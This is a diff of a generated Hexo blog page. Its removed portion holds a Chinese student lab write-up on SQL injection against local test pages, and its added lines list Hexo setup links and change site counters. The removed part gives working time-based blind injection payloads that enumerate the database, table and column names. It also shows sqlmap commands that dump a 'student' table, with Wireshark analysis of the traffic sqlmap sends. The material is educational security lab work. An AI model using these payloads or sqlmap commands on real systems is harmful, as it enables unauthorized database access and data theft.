- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((mid(database(),1,1)='t'),3,0))<span class="comment"># =&gt; 't'</span></span><br><span class="line">1' and sleep(if((mid(database(),2,1)='e'),3,0))<span class="comment"># =&gt; 'e'</span></span><br><span class="line">1' and sleep(if((mid(database(),3,1)='s'),3,0))<span class="comment"># =&gt; 's'</span></span><br><span class="line">1' and sleep(if((mid(database(),4,1)='t'),3,0))<span class="comment"># =&gt; 't'</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>所以数据库名为test</p>
-</blockquote>
+<li><p>Next github源码包</p>
+<p> <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next</a></p>
 </li>
-<li><p>判断表的个数</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if(((<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span>),<span class="number">3</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>有一个表</p>
-</blockquote>
+<li><p>GitHub+Hexo 搭建个人网站详细教程</p>
+<p> <a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26625249</a></p>
 </li>
-<li><p>猜测每个表的长度</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if(((<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">1</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;不等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if(((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=7),2,0))# =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>表名长度为7</p>
-</blockquote>
+<li><p>hexo使用手册</p>
+<p> <a href="https://hexo.io/docs/server" target="_blank" rel="noopener">https://hexo.io/docs/server</a></p>
 </li>
-<li><p>判断表名</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122),2,0))# =&gt;等待</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">109</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118),2,0))# =&gt;不等待</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117),2,0))# =&gt;不等待</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">116</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;不等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115),2,0))# =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>则表名的第一个字母为’s’<br>以此类推可以得到表名’student’</p>
-</blockquote>
+<li><p>如何更新npm（它要在themes目录下才能运行，不更新在ubuntu16.04环境下hexo命令会出现异常）</p>
+<p> <a href="https://blog.csdn.net/y5492853/article/details/79529410" target="_blank" rel="noopener">https://blog.csdn.net/y5492853/article/details/79529410</a></p>
 </li>
-<li><p>判断表中列数</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if(((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span>)=<span class="number">1</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt; 不等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if(((select count(column_name) from information_schema.columns where table_name='</span>student<span class="string">')=3),2,0))# =&gt; 等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>字段数为3</p>
-</blockquote>
+<li><p>Hexo-NexT搭建个人博客</p>
+<p> <a href="https://neveryu.github.io/2016/09/03/hexo-next-one/" target="_blank" rel="noopener">https://neveryu.github.io/2016/09/03/hexo-next-one/</a></p>
 </li>
-<li><p>判断表中每列长度</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt; 等待：长度为2</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 1,1),1))=4),2,0))# =&gt;等待：长度为4</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">5</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待：长度为5</span></span><br></pre></td></tr></table></figure>
+<li><p>hexo中获取图片失败问题</p>
+<p><a href="https://www.jianshu.com/p/c2ba9533088a" target="_blank" rel="noopener">https://www.jianshu.com/p/c2ba9533088a</a></p>
 </li>
-<li><p>判断表中每列列名</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>),<span class="number">1</span>,<span class="number">0</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>一步一步来就可以搞定</p>
-</blockquote>
+<li><p>hexo + next主题高级配置</p>
+<p><a href="https://www.jianshu.com/p/344cf061598d" target="_blank" rel="noopener">https://www.jianshu.com/p/344cf061598d</a></p>
+</li>
+<li><p>hexo常用命令</p>
+<p><a href="https://segmentfault.com/a/1190000002632530" target="_blank" rel="noopener">https://segmentfault.com/a/1190000002632530</a></p>
+</li>
+<li><p>添加分类与标签</p>
+<p><a href="https://www.jianshu.com/p/e17711e44e00" target="_blank" rel="noopener">https://www.jianshu.com/p/e17711e44e00</a></p>
+</li>
+<li><p>每次在主页上阅读更多的链接总是指向发表时间最早的一篇，解决方法：</p>
+<p><a href="https://hexo.io/zh-cn/docs/permalinks.html" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/permalinks.html</a></p>
+</li>
+<li><p>蜂窝状动画</p>
+<p><a href="http://wintersmilesb101.online/2017/03/22/Next-Use-Nest/" target="_blank" rel="noopener">http://wintersmilesb101.online/2017/03/22/Next-Use-Nest/</a></p>
 </li>
 </ol>
-</li>
-<li><p>这一小问是更新数据库操作，我们可以使用更新数据注入方式来向数据库中非法插入数据，思路就是在insert、update、delete语句中人为构造语法错误，利用如下语句：</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> student <span class="keyword">SET</span> score=<span class="string">''</span>inject here<span class="string">''</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> student <span class="keyword">SET</span> score=<span class="string">'"inject here"'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-<p>  我将在sqlmap中演示</p>
-</li>
-</ul>
-<h3 id="利用sqlmap自动化注入并用wireshark抓包分析"><a href="#利用sqlmap自动化注入并用wireshark抓包分析" class="headerlink" title="利用sqlmap自动化注入并用wireshark抓包分析"></a>利用sqlmap自动化注入并用wireshark抓包分析</h3><ol>
-<li><p>对于普通查询结果的场景，我们可以使用Union查询的方式</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>这样一来我们就找到了Union联合查询，Boolean-based和Time-based3种不同方式的注入点。</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d1.png" alt="coin"></p>
-<blockquote>
-<p>接着开始搞事情</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span> --current-db --current-user</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d2.png" alt="coin"></p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span> --tables -D <span class="built_in">test</span> --columns</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d3.png" alt="coin"></p>
-<blockquote>
-<p>dump数据库内容</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span> --dump -T <span class="string">"student"</span> -D <span class="string">"test"</span></span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d4.png" alt="coin"></p>
-<blockquote>
-<p>通过抓包分析可以得出sqlmap的查询语句</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d5.png" alt="coin"><br> <img src="/网络安全实验/网络对抗原理实验一/d10.png" alt="coin"></p>
-<blockquote>
-<p>大致意思就是先判断是否有注入点，再判断过滤字符，接着判断id的最大长度（推测应该是使用二分法），然后就是用我上述手工注入的方法:数据库名长度=&gt;数据库名=&gt;表的个数=&gt;每个表名长度=&gt;每个表名=&gt;列的个数=&gt;每个列名长度=&gt;每个列名。不过我发现sqlmap用了很多随机字符串拼接的方式。</p>
-</blockquote>
-</li>
-<li><p>对于仅返回true or false结果的场景，我们可以使用Union查询的方式就失效了，只能布尔查询。</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit"</span> --batch</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d6.png" alt="coin"></p>
-<blockquote>
-<p>有布尔盲注注入点，开始搞事情</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit"</span> --tables -D <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d7.png" alt="coin"></p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit"</span> --dump -D <span class="built_in">test</span> -T student</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d8.png" alt="coin"></p>
-<blockquote>
-<p>抓包分析一下</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d9.png" alt="coin"></p>
-<blockquote>
-<p>大体看了一下前面的查询语句和Union查询没什么区别，爆库也是按照上述的方法<br> <img src="/网络安全实验/网络对抗原理实验一/d11.png" alt="coin"></p>
-</blockquote>
-<blockquote>
-<p>选取一条感觉和我手工注入的方式很相似，然后再进行转码分析一下，发现它是采用二分法来依次确定字母ascii码值的</p>
-</blockquote>
-</li>
-<li><p>第三种对于返回值中夹杂着随机字符串的</p>
-<blockquote>
-<p>当我使用如下命令时发现并不能成功</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit"</span> --technique-B</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>于是使用</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>发现注入点</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e1.png" alt="coin"></p>
-<blockquote>
-<p>但是奇怪的是这却是boolean-based的盲注，继续进行发现它还是以Time-based进行注入的，应该是随机字符串防御住了布尔盲注</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e2.png" alt="coin"></p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit"</span> --tables -D <span class="built_in">test</span> --columns -T student</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e3.png" alt="coin"></p>
-</li>
-<li><p>这一题也有点类似</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/4.php?id=1&amp;submit=submit"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>在sqlmap运行的过程中，发现了如下日志</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e4.png" alt="coin"></p>
-<blockquote>
-<p>解答了刚才的疑惑，原来是添加了随机字符串之后sqlmap无法处理动态HTTP返回值</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e5.png" alt="coin"></p>
-<blockquote>
-<p>忽略字符串，终于找到了注入点</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e6.png" alt="coin"></p>
-<blockquote>
-<p>以下就可以进行爆库操作。</p>
-</blockquote>
-</li>
-<li><p>如果返回值是一个固定的值那么只能采用Time-based</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=T -u <span class="string">"http://127.0.0.1/sql_injection/5.php?id=1&amp;submit=submit"</span> --batch</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e3.png" alt="coin"></p>
-<blockquote>
-<p>抓包查看</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e7.png" alt="coin"></p>
-</li>
-</ol>
-<p>###参考资料</p>
-<ol>
-<li><a href="https://blog.csdn.net/xiejunna/article/details/76576804" target="_blank" rel="noopener">https://blog.csdn.net/xiejunna/article/details/76576804</a></li>
-<li><a href="https://my.oschina.net/duwaiweb/blog/80578" target="_blank" rel="noopener">https://my.oschina.net/duwaiweb/blog/80578</a></li>
-<li><a href="https://blog.csdn.net/we_shell/article/details/37772941" target="_blank" rel="noopener">https://blog.csdn.net/we_shell/article/details/37772941</a></li>
-<li><a href="https://www.cnblogs.com/dee0912/p/5240370.html" target="_blank" rel="noopener">https://www.cnblogs.com/dee0912/p/5240370.html</a></li>
-<li><a href="https://blog.csdn.net/qq_35544379/article/details/77351783" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77351783</a></li>
-<li><a href="https://blog.csdn.net/Code_My_Life/article/details/48135319" target="_blank" rel="noopener">https://blog.csdn.net/Code_My_Life/article/details/48135319</a></li>
-<li><a href="https://blog.csdn.net/dgeek/article/details/69525403" target="_blank" rel="noopener">https://blog.csdn.net/dgeek/article/details/69525403</a></li>
-<li><a href="https://blog.csdn.net/baidu_37108358/article/details/80766939" target="_blank" rel="noopener">https://blog.csdn.net/baidu_37108358/article/details/80766939</a></li>
-<li><a href="https://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html" target="_blank" rel="noopener">https://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</a></li>
-</ol>
-<h3 id="实验总结与心得"><a href="#实验总结与心得" class="headerlink" title="实验总结与心得"></a>实验总结与心得</h3><ul>
-<li>对于注入，总的来说有3种主要方式：联合查询、布尔盲注、时间盲注。这三种方式各有各自特点。我通过手工注入从获取数据库名到爆库，直到最后还可以进一步联合查询sys数据库中的敏感信息（这些也是可以做的）。<ul>
-<li>联合查询：适用于有返回结果的注入方式，查询速度较快。</li>
-<li>boolean-based方式：适用于返回值只有true or false的情况，我们可以用二分法不断地判断正误，从而一个字母一个字母地找出数据库名、表名、列名。</li>
-<li>time-based方式：适用于不管有没有返回结果均返回固定值的方式，主要是用到了注入中的<code>sleep()</code>函数，这样更慢但同时也更隐蔽。</li>
-<li>一般注入方式的选择是：先Union，再boolean-based，最后time-based。</li>
-</ul>
-</li>
-<li>至于随机字符串，它们对于手工注入丝毫没有影响，主要是影响sqlmap，因为每次地返回结果是动态的就会导致sqlmap工作异常，这是一种很好的屏蔽机制。</li>
-</ul>
 
           
         
@@ -916,7 +771,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
   </nav>
 
 
@@ -964,7 +819,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -975,7 +830,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -986,7 +841,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1086,7 +941,7 @@
     
       <span class="post-meta-item-text">全站字数&#58;</span>
     
-    <span title="全站字数">13.7k</span>
+    <span title="全站字数">12.7k</span>
   
 </div>
 
